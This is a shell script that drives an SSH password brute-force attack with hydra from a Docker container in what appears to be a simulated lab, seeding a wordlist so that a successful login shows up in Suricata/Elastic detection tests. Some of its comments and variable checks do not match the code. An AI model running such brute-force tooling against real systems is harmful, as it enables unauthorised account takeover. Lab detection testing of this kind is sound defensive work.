#!/bin/sh

set -e

# ./ssh_bruteforce_hydra.sh clab-virtual-env-attacker
# ./ssh_bruteforce_hydra.sh clab-virtual-env-attacker enterprise.com 22 vntd
# ./ssh_bruteforce_hydra.sh clab-virtual-env-attacker enterprise.com 22 list

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "SSH Brute Force | hydra"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target] [port] [user|list]"
    echo "   user  -> single username to target"
    echo "   list  -> iterate over a common username wordlist"
    exit 0
fi

ATTACKER="$1"
TARGET="${2:-enterprise.com}"             # Default target URL
PORT="${3:-22}"                           # Default to port 80
TARGET_USER="${4:-vntd}"                  # Renamed from USER - USER is a reserved shell variable

# https://www.kali.org/tools/hydra/
echo "================================"
echo "Attack: SSH Brute Force (hydra)"
echo "Target: $TARGET:$PORT"
echo "User: $TARGET_USER"
echo "Attacker: $ATTACKER"
echo "================================"

# Write a short wordlist that includes the real password
# This guarantees a successful login event shows up in Suricata/Elastic
docker exec "$ATTACKER" bash -c "cat > /wordlists/ssh_wordlist.txt << 'EOF'
admin
password
123456
root
letmein
qwerty
welcome
pswd
vntd
toor
EOF"

# Password list to use. In this scenario, use the default created one for fast, reproducible results.
#PASSLIST="/wordlists/10k-most-common.txt"
#PASSLIST="/wordlists/xato-net-10-million-passwords-100000.txt"
PASSLIST="/wordlists/ssh_wordlist.txt"

CUSTOM="/wordlists/ssh_wordlist.txt"

# Append at the end of the file more passwords (the correct password is included [pswd])
# -l  -> Single username to attempt
# -L  -> Username wordlist (used when TARGET_USER is set to 'list')
# -P  -> Password wordlist
# -s  -> Target port
# -t  -> Number of parallel tasks (threads) per host
# -V  -> Verbose
# -f  -> Stop immediately after the first valid credential is found
docker exec "$ATTACKER" grep -qx "vntd" "$PASSLIST" || \
docker exec "$ATTACKER" bash -c "cat '$CUSTOM' >> '$PASSLIST'"

# Users
USERLIST="/wordlists/users.txt"

if [ "$USER" = "list" ]; then
    docker exec "$ATTACKER" \
        hydra \
        -L "$USERLIST" \
        -P "$PASSLIST" \
        -s "$PORT" \
        -t 64 \
        -V \
        -f \
        ssh://"$TARGET"
else
    docker exec "$ATTACKER" \
        hydra \
        -l "$TARGET_USER" \
        -P "$PASSLIST" \
        -s "$PORT" \
        -t 64 \
        -V \
        -f \
        ssh://"$TARGET"
fi

# Clean up any remaining hydra child processes
docker exec "$ATTACKER" pkill -9 hydra 2>/dev/null || true